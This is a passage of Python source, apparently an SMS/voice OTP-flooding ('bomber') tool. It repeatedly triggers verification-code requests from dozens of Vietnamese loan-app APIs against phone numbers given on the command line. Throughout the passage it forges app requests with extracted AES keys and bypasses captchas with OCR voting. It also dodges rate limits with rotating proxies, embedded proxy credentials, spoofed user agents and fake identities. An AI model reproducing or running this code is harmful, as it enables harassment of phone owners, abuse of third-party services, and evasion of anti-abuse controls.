    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000000",
        "phone": phone_otp,
    }
    async with httpx.AsyncClient() as client:
        res1 = await client.post(
            "https://api.vaycash.net/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers
        )
        res2 = await client.post(
            "https://api.vaycash.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call10_okay(phone_otp):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000001",
        "phone": phone_otp,
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://notice.vaycash.net/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call11(phone_otp):
    headers = build_headers("https://ios-h5.kasikvayfinance.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Kasik Vay",
        "app_package_name": "credit.kasikvay.ssef",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vkfai.kasikvayfinance.com/v2/login/captcha",
            json={**payload, "type": 1, "app_id": "233000000"},
            headers=headers
        )

async def call11_okay(phone_otp):
    headers = build_headers("https://ios-h5.kasikvayfinance.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Kasik Vay",
        "app_package_name": "credit.kasikvay.ssef",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vkfii.kasikvayfinance.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "233000001"},
            headers=headers
        )

async def call12(phone_otp):
    headers = build_headers("http://sumhanoivn.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "ios",
        "app_name": "Mitsui Vay",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://vishi.sumhanoivn.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "231000001"},
            headers=headers
        )

async def call12_okay(phone_otp):
    headers = build_headers("http://sumhanoivn.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "ios",
        "app_name": "Mitsui Vay",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://vashi.sumhanoivn.com/v2/login/captcha",
            json={**payload, "app_id": "231000000"},
            headers=headers
        )

async def call13(phone_otp):
    headers = build_headers("https://vn-android-topqcash-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "QCash",
        "type": 2,
        "app_package_name": "business.qcash.hbuy",
        "platform": "android",
        "app_id": "227000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vatqi.topqcash.net/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call13_okay(phone_otp):
    headers = build_headers("https://iosweb.topqcash.net/#/login")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "QCash",
        "app_package_name": "business.qcash.hbuy",
        "type": 2,
        "platform": "ios",
        "app_id": "227000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vitqi.topqcash.net/v2/login/captcha",
            headers=headers,
            json=payload
        )

async def call14(phone_otp):
    headers = build_headers("https://android.umoneynv.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "U Money",
        "app_package_name": "com.u.money.cash.loan.credit",
        "platform": "android",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.umoneynv.net/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "2700000000"},
            headers=headers
        )

async def call14_okay(phone_otp):
    headers = build_headers("https://android.umoneynv.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "U Money",
        "app_package_name": "com.u.money.cash.loan.credit",
        "platform": "android",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://h5api.umoneynv.net/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "2700000001"},
            headers=headers
        )

async def call15(phone_otp):
    headers = build_headers("https://android-h5.truongtaionline.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Truong Tai Money",
        "app_package_name": "truong.tai.phat.online",
        "platform": "android",
        "app_id": "242000000",
    }
    async with httpx.AsyncClient() as client:
        res1 = await client.post(
            "https://vgtai.truongtaionline.com/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers
        )
        r = await client.post(
            "https://vgtai.truongtaionline.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call16(phone_otp):
    headers = build_headers("https://android-h5.dhloantrading.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "DH Loan",
        "app_package_name": "com.dhloan.trading.vaynhanh",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        r1 = await client.post(
            "https://dtaiv.dhloantrading.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "243000000"},
            headers=headers
        )
        r2 = await client.post(
            "https://dtiiv.dhloantrading.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "243000001"},
            headers=headers
        )

async def call17(phone_otp):
    headers = build_headers("https://vn-ios-h5-sunmobile.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Sun Mobile",
        "app_package_name": "sunvay.online",
        "platform": "ios",
        "app_id": "238000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call17_okay(phone_otp):
    headers = build_headers("https://vn-android-h5-sunmobile.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Sun Mobile",
        "app_package_name": "sunvay.online",
        "platform": "android",
        "app_id": "238000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call18(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "GbCredit",
        "app_package_name": "com.gbcredit.money.cash",
        "platform": "android",
        "app_id": "2900000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.gbcreditvn.net/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call18_okay(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "GbCredit",
        "app_package_name": "com.gbcredit.money.cash",
        "platform": "android",
        "app_id": "2900000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.gbcreditvn.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call19(phone_otp):
    headers = build_headers("https://bsawv.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://bsaiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call19_okay(phone_otp):
    headers = build_headers("https://bsawv.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000", "type": 2}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://bsiiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call20(phone_otp):
    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "android",
        "app_name": "Bon Money",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://bmvai.bonmoneydile.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "260000000"},
            headers=headers
        )

async def call20_okay(phone_otp):
    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "android",
        "app_name": "Bon Money",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://bmvii.bonmoneydile.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "260000001"},
            headers=headers
        )

async def call21(phone_otp):
    headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
    payload = {
        "country_code": "vn",
        "phone": phone_otp,
        "app_name": "Nathco Vay",
        "app_package_name": "com.artmis.dong.vn",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://oyvai.nathcopay.com/v2/login/captcha",
            json={**payload, "app_id": "235000000"},
            headers=headers
        )

async def call21_okay(phone_otp):
    headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
    payload = {
        "country_code": "vn",
        "phone": phone_otp,
        "app_name": "Nathco Vay",
        "app_package_name": "com.artmis.dong.vn",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://oyvii.nathcopay.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "235000001"},
            headers=headers
        )

async def call22(phone_otp):
    headers = build_headers("https://android-h5.microfinmobile.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Microfin Mobile",
        "app_package_name": "microfin.moblie.thpay",
        "platform": "android",
        "app_id": "239000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mbaiv.microfinmobile.com/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call22_okay(phone_otp):
    headers = build_headers("https://android-h5.microfinmobile.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Microfin Mobile",
        "app_package_name": "microfin.moblie.thpay",
        "platform": "android",
        "app_id": "239000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mbaiv.microfinmobile.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call23(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "OKCredit",
        "app_package_name": "com.OKCredit.loan.cash",
        "platform": "android",
        "app_id": "2100000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/OKCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://api.getokcredit.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call_mydong(phone_otp):
    headers = build_headers("https://android.mydonny.net/")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://notice.mydonny.net/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call_mydong_okay(phone_otp):
    headers = build_headers("https://android.mydonny.net/")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://api.mydonny.net/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def vay24h(phone_otp: str):
    CF_URL = [
        "https://ok-6fb5.cotenhp2888.workers.dev",
        "https://doaxa--71c050ce533111f1bce0ee650bb23af1.web.val.run"
    ]
    BASE_URL = random.choice(CF_URL)
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.get(BASE_URL, params={"phone": phone_otp, "fn": "vay24h"})
        return r.json()

async def uvwallet(phone_otp: str):
    CF_URL = [
        "https://ok-6fb5.cotenhp2888.workers.dev",
        "https://doaxa--71c050ce533111f1bce0ee650bb23af1.web.val.run"
    ]
    BASE_URL = random.choice(CF_URL)
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.get(BASE_URL, params={"phone": phone_otp, "fn": "uvwallet"})
        return r.json()

async def itake(phone_otp):
    KEY = b"aajiaozicashmeh5"
    IV  = b"hajiaozicashmeh5"

    def aes_encrypt(payload):
        raw = json.dumps(payload, separators=(",", ":")).encode()
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        encrypted = cipher.encrypt(pad(raw, AES.block_size))
        return base64.b64encode(encrypted).decode()

    mobile = "84" + phone_otp.lstrip("0")
    payload = {
        "phone": mobile,
        "isVoice": False,
        "h5": False,
        "deviceId": ""
    }

    body = aes_encrypt(payload)

    headers = {
        "fpPlatform": "5",
        "appId": "20",
        "language": "vi-VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.6itake-moment.com/login",
        "country": "undefined",
        "Origin": "https://h5.6itake-moment.com",
        "Sec-Fetch-Dest": "empty",
        "fpDeviceId": "",
        "version": "1.0.0_4.0.4",
        "Sec-Fetch-Site": "same-origin",
        "fingerPrint": "",
        "deviceId": "",
        "platform": "2",
        "token": "undefined",
        "x_x_path": "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0=",
        "loginPlatform": "H5",
        "marketToken": "undefined",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Sec-Fetch-Mode": "cors",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }

    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.post(
            "https://h5.6itake-moment.com/h5/3tcobpsevujcfu4ga4qpdeaddh0gdhd4",
            headers=headers,
            data=body,
        )

        print("STATUS:", r.status_code)

async def main_9():
    if len(sys.argv) < 2:
        print("Cách dùng: python main.py <số_điện_thoại_1> [số_điện_thoại_2] ... <số_lần_lặp>")
        print("Ví dụ: python main.py 0123456789 0987654321 3")
        sys.exit(1)
    
    so_lan_lap = int(sys.argv[-1])
    if so_lan_lap <= 0:
        print("Số lần lặp phải lớn hơn 0")
        sys.exit(1)
    
    phone_otps = sys.argv[1:-1]
    if not phone_otps:
        print("Vui lòng cung cấp ít nhất 1 số điện thoại")
        sys.exit(1)
    
    if len(phone_otps) > 10:
        phone_otps = phone_otps[:10]
    
    print(f"\n{'='*60}")
    print(f"📱 Số điện thoại: {phone_otps}")
    print(f"🔄 Số lần lặp: {so_lan_lap}")
    print(f"{'='*60}\n")
    
    all_funcs = [
        itake,
        vay24h,
        htc_sms,
        vncredit_sms,
        call_mfast360,
        call_vaydep365,
        qq_sms,
        call2,
        mfast,
        lavi_sms,
        call13,
        call3,
        ptvay_sms,
        call_senvay,
        call_hoivan,
        vncredit_voice,
        call21,
        combo2,
        uvwallet,
        call1,
        combo1,
        achau_sms,
        call14_okay,
        petro_sms,
        call_mydong,
        call_mydong_okay,
        call20,
        call8,
        call9,
        call11,
        call12,
        random_site,
        call_hoivan_okay,
        call12_okay,
        call14,
        call10,
        call19,
        call11_okay,
        call18,
        call15,
        call20_okay,
        call16,
        call22_okay,
        call19_okay,
        call17,
        call23,
        call22,
        call21_okay,
        call13_okay,
        call18_okay,
        call10_okay,
        call17_okay,
        call_vvay,
        calll_vvay,
    ]
    
    async def safe_call(func, phone_otp, lan):
        name = func.__name__
        try:
            await func(phone_otp)
            print(f" 📡 {name} {phone_otp} ✅ [Lần {lan}]")
        except Exception as e:
            print(f" ✘ {name} lỗi: {e} [Lần {lan}]")

    for lan in range(1, so_lan_lap + 1):
        print(f"\n{'='*60}")
        print(f"🔄 LẦN {lan}/{so_lan_lap}")
        print(f"{'='*60}\n")
        
        for idx, func in enumerate(all_funcs, 1):
            await asyncio.gather(*[safe_call(func, phone_otp, lan) for phone_otp in phone_otps])
            
            if idx < len(all_funcs):
                await asyncio.sleep(1)
        
        if lan < so_lan_lap:
            await asyncio.sleep(1)
    
    print(f"\n{'='*60}")
    print(f"✅ HOÀN THÀNH {so_lan_lap} LẦN LẶP")
    print(f"{'='*60}\n")
# ── V-Vay AES-128-CBC helpers (key/IV từ umi.a367d612.js) ──────────────────
_VVAY_KEY = b"aajiaozicashmeh5"
_VVAY_IV  = b"hajiaozicashmeh5"

def _vvay_encrypt(data) -> str:
    """Encrypt dict/str → base64 ciphertext (AES-128-CBC, PKCS7)."""
    from Crypto.Cipher import AES as _AES
    from Crypto.Util.Padding import pad as _pad
    if isinstance(data, dict):
        import json as _json
        data = _json.dumps(data, separators=(',', ':'))
    ct = _AES.new(_VVAY_KEY, _AES.MODE_CBC, _VVAY_IV).encrypt(
        _pad(data.encode(), 16)
    )
    return base64.b64encode(ct).decode()

def _vvay_decrypt(b64_str: str) -> dict:
    """Decrypt base64 ciphertext → dict."""
    from Crypto.Cipher import AES as _AES
    from Crypto.Util.Padding import unpad as _unpad
    ct = base64.b64decode(b64_str)
    plain = _unpad(_AES.new(_VVAY_KEY, _AES.MODE_CBC, _VVAY_IV).decrypt(ct), 16)
    return json.loads(plain.decode('utf-8').strip())

# x_x_path = AES encrypt của actual path "/login/requestVerifyCode" (static)
_VVAY_XPATH = _vvay_encrypt("/login/requestVerifyCode")
# Endpoint mới (từ sniff thực tế 2026-07-13)
_VVAY_URL   = "https://h5api.6vn-vayvn.com/h5/yt3tfaf96gxrl8ogd0a6i7tadewrqrxf"

def _vvay_headers() -> dict:
    return {
        "Host": "h5api.6vn-vayvn.com",
        "appId": "4",
        "language": "vi-VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5api.6vn-vayvn.com/login",
        "fpPlatform": "5",
        "country": "undefined",
        "Origin": "https://h5api.6vn-vayvn.com",
        "Sec-Fetch-Dest": "empty",
        "fpDeviceId": "",
        "version": "1.0.0_4.0.8",
        "Sec-Fetch-Site": "same-origin",
        "fingerPrint": "",
        "Content-Type": "application/json",
        "platform": "2",
        "token": "undefined",
        "x_x_path": _VVAY_XPATH,
        "loginPlatform": "H5",
        "marketToken": "undefined",
        "Accept": "application/json",
        "Sec-Fetch-Mode": "cors",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Priority": "u=3, i",
        "deviceId": "",
    }

async def call_vvay(phone_otp: str):
    """V-Vay — SMS OTP (isVoice=false). Body AES-128-CBC encrypted."""
    device_id = uuid.uuid4().hex
    body = _vvay_encrypt({"phone": phone_otp, "isVoice": False, "h5": False, "deviceId": device_id})
    try:
        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
            r = await client.post(
                _VVAY_URL,
                data=body,
                headers=_vvay_headers(),
            )
        resp = _vvay_decrypt(r.text)
        if resp.get("successful"):
            print(f"✅ call_vvay | {phone_otp} | SMS OK")
        else:
            print(f"⚠️ call_vvay | {phone_otp} | {resp}")
    except Exception as e:
        print(f"❌ call_vvay | {phone_otp} | {e}")

async def calll_vvay(phone_otp: str):
    """V-Vay — Voice OTP (isVoice=true). Body AES-128-CBC encrypted."""
    device_id = uuid.uuid4().hex
    body = _vvay_encrypt({"phone": phone_otp, "isVoice": True, "h5": False, "deviceId": device_id})
    try:
        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
            r = await client.post(
                _VVAY_URL,
                data=body,
                headers=_vvay_headers(),
            )
        resp = _vvay_decrypt(r.text)
        if resp.get("successful"):
            print(f"✅ calll_vvay | {phone_otp} | Voice OK")
        else:
            print(f"⚠️ calll_vvay | {phone_otp} | {resp}")
    except Exception as e:
        print(f"❌ calll_vvay | {phone_otp} | {e}")


# ============================================================
# FILE 10
# ============================================================
import sys
import random
import string
import httpx
import asyncio
import time
import uuid
import base64
import hashlib
import json
import io
import unicodedata
from typing import Optional, Any
from urllib.parse import urlparse
from Crypto.Cipher import AES, PKCS1_v1_5 as RSA_PKCS1
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from PIL import ImageFile, Image, ImageEnhance
import ddddocr

ImageFile.LOAD_TRUNCATED_IMAGES = True
_ocr      = ddddocr.DdddOcr(show_ad=False)
_ocr_beta = ddddocr.DdddOcr(show_ad=False, beta=True)
_ocr_old  = ddddocr.DdddOcr(show_ad=False, old=True)



_PROXIES = [
    {
        "proxy": "http://omXE3FBH:f13URJtd9I@sv1.proxysocks5.vn:49205",
        "change_ip_url": "https://api.proxysocks5.vn/api/proxy/changeIp?tokenProxy=5N8XUbxcvDsDBMqFVF49k",
    }
]

_proxy_index = 0


def _current_proxy() -> str:
    return _PROXIES[_proxy_index]["proxy"]


def _current_change_ip_url() -> str:
    return _PROXIES[_proxy_index]["change_ip_url"]


def _rotate_proxy_index() -> None:
    global _proxy_index
    _proxy_index = (_proxy_index + 1) % len(_PROXIES)


_OK1_MAX_CONCURRENT = 300
_ok1_semaphore: Optional[asyncio.Semaphore] = None


def _get_ok1_semaphore() -> asyncio.Semaphore:
    global _ok1_semaphore
    if _ok1_semaphore is None:
        _ok1_semaphore = asyncio.Semaphore(_OK1_MAX_CONCURRENT)
    return _ok1_semaphore


class _ClientCtx:
    def __init__(self, **kw):
        self._kw = kw
        self._client: Optional[httpx.AsyncClient] = None
        self._sem: Optional[asyncio.Semaphore] = None

    async def __aenter__(self) -> httpx.AsyncClient:
        self._sem = _get_ok1_semaphore()
        await self._sem.acquire()
        kw = self._kw.copy()
        kw.setdefault("http2", False)
        self._client = httpx.AsyncClient(**kw)
        return await self._client.__aenter__()

    async def __aexit__(self, *args):
        try:
            if self._client is not None:
                await self._client.__aexit__(*args)
        finally:
            if self._sem is not None:
                self._sem.release()


def _make_client(**kw) -> _ClientCtx:
    return _ClientCtx(**kw)


async def _doi_ip():
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.get(_current_change_ip_url())
        print(f"[ChangeIP] {r.status_code} — {r.text[:100]}")
        _rotate_proxy_index()
    except Exception as e:
        print(f"Okay")


_XMH_UA_POOL = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
]

_IOS_CFNETWORK = [
    ("1568.300.101", "24.2.0"),
    ("1568.200.51", "24.1.0"),
    ("1490.0.4", "23.6.0"),
    ("1490.0.4", "23.5.0"),
    ("1480.0.4", "23.4.0"),
]

HO = [
    "Nguyễn", "Trần", "Lê", "Phạm", "Hoàng", "Huỳnh", "Phan",
    "Vũ", "Võ", "Đặng", "Bùi", "Đỗ", "Hồ", "Ngô", "Dương"
]
TEN_DEM = [
    "Văn", "Thị", "Minh", "Quốc", "Thanh", "Ngọc", "Gia",
    "Đức", "Hữu", "Anh", "Tuấn", "Bảo", "Kim", "Xuân"
]
TEN = [
    "An", "Bình", "Dũng", "Hùng", "Huy", "Khánh", "Long",
    "Nam", "Phúc", "Quân", "Sơn", "Thành", "Thắng", "Tú",
    "Việt", "Linh", "Lan", "Trang", "Mai", "Hương",
    "Phương", "Nhung", "Thảo", "Yến", "Ngân"
]


def random_vietnamese_name():
    return f"{random.choice(HO)} {random.choice(TEN_DEM)} {random.choice(TEN)}"


def remove_accents(text):
    return ''.join(
        c for c in unicodedata.normalize("NFD", text)
        if unicodedata.category(c) != "Mn"
    )


def generate_email():
    full_name = random_vietnamese_name()
    username = remove_accents(full_name).lower().replace(" ", "")
    username += str(random.randint(10000, 99999))
    return f"{username}@gmail.com"


email = generate_email()


def get_random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))


def get_random_ipv6():
    return ":".join(format(random.randint(0, 65535), "x") for _ in range(8))


def _random_android_id() -> str:
    return "".join(random.choices("0123456789abcdef", k=32))


def gen_device_id():
    return str(uuid.uuid4()).upper()


def _qq_solve(b64_str: str) -> str:
    """Giải captcha ảnh dùng nhiều model OCR + nhiều kiểu tiền xử lý rồi vote."""
    def _read(pil_img, model=_ocr) -> str:
        buf = io.BytesIO()
        pil_img.convert("RGB").save(buf, format="PNG")
        try:
            r = model.classification(buf.getvalue())
            return r.strip() if isinstance(r, str) else ""
        except Exception:
            return ""

    try:
        raw = base64.b64decode(b64_str)
        img = Image.open(io.BytesIO(raw))
        img.load()
        rgb = img.convert("RGB")
        gray = img.convert("L")

        # Tạo danh sách ảnh biến thể
        variants = [
            rgb,
            img.resize((img.width * 3, img.height * 3), Image.LANCZOS).convert("RGB"),
            img.resize((img.width * 4, img.height * 4), Image.LANCZOS).convert("RGB"),
            ImageEnhance.Contrast(rgb).enhance(2.0),
            ImageEnhance.Contrast(rgb).enhance(3.0),
            ImageEnhance.Sharpness(rgb).enhance(2.5),
            gray.convert("RGB"),
            ImageEnhance.Contrast(gray.convert("RGB")).enhance(3.0),
            # binary threshold
            gray.point(lambda p: 255 if p > 128 else 0).convert("RGB"),
            gray.point(lambda p: 255 if p > 100 else 0).convert("RGB"),
            # invert (dark bg, light text)
            ImageEnhance.Contrast(
                Image.fromarray(255 - __import__("numpy").array(gray)).convert("RGB")
            ).enhance(2.0) if True else rgb,
        ]

        candidates: list[str] = []
        for v in variants:
            for model in (_ocr, _ocr_beta, _ocr_old):
                res = _read(v, model)
                if res:
                    candidates.append(res)

        if not candidates:
            return ""

        # Chọn kết quả có độ dài ≥ 4 và xuất hiện nhiều nhất (voting)
        from collections import Counter
        valid = [c for c in candidates if len(c) >= 4]
        if valid:
            return Counter(valid).most_common(1)[0][0]
        # Nếu không có kết quả ≥4 ký tự, trả về kết quả dài nhất
        return max(candidates, key=len)
    except Exception:
        return ""


def _t24h_jwt_remaining(tok: str) -> int:
    try:
        import base64 as _b64
        seg = tok.split(".")[1]
        seg += "=" * (4 - len(seg) % 4)
        exp = json.loads(_b64.b64decode(seg)).get("exp", 0)
        return max(0, exp - int(time.time()))
    except Exception:
        return 0


def _load_appcheck_token(app_id: str) -> str:
    import pathlib as _pl
    candidates = [
        _pl.Path(__file__).parent / "tokens.json",
        _pl.Path("/root/tokens.json"),
    ]
    for p in candidates:
        try:
            if not p.exists():
                continue
        except (PermissionError, OSError):
            continue
        try:
            data = json.loads(p.read_text(encoding="utf-8"))
            for app in data.get("apps", []):
                if app.get("id") == app_id:
                    tok = app.get("firebaseAppCheck") or ""
                    if not tok:
                        print(f"[tokens.json] ⚠️  [{app_id}] chưa có token — chạy grab-jwt trước")
                        return ""
                    remaining = _t24h_jwt_remaining(tok)
                    if remaining > 120:
                        return tok
                    print(f"[tokens.json] ⚠️  [{app_id}] token hết hạn ({remaining}s còn lại) — đang chờ grab-jwt refresh")
                    return ""
            print(f"[tokens.json] ⚠️  Không tìm thấy app_id='{app_id}' trong {p}")
            return ""
        except Exception as e:
            print(f"[tokens.json] ❌ Lỗi đọc {p}: {e}")
    print(f"[tokens.json] ❌ Không tìm thấy tokens.json")
    return ""


def _load_gt365_captcha() -> str:
    import pathlib as _pl
    candidates = [
        _pl.Path(__file__).parent / "tokens.json",
        _pl.Path("/root/tokens.json"),
    ]
    for p in candidates:
        try:
            if not p.exists():
                continue
        except (PermissionError, OSError):
            continue
        try:
            data = json.loads(p.read_text(encoding="utf-8"))
            for app in data.get("apps", []):
                if app.get("id") == "gt365":
                    tok = app.get("captchaToken") or ""
                    if tok:
                        return tok
